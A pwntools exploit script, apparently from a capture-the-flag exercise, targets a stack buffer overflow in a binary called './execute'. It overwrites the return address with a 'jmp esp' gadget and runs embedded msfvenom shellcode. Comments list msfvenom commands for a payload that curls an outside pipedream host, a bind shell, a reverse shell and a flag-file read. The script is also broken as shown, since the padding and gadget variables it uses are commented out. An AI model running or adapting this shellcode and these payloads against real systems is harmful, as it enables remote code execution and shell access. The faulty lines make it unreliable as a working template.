from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './execute'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Offset to EIP
# padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
# jmp_esp = asm('jmp esp')
# jmp_esp = next(elf.search(jmp_esp))

# msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
# msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
# msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python

# Exploit
buf = b""
buf += b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
buf += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
buf += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
buf += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
buf += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
buf += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
buf += b"\xa4\xec\x38\x51\x5f\xf1"

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    buf
)

# Write payload to file
write("payload", payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
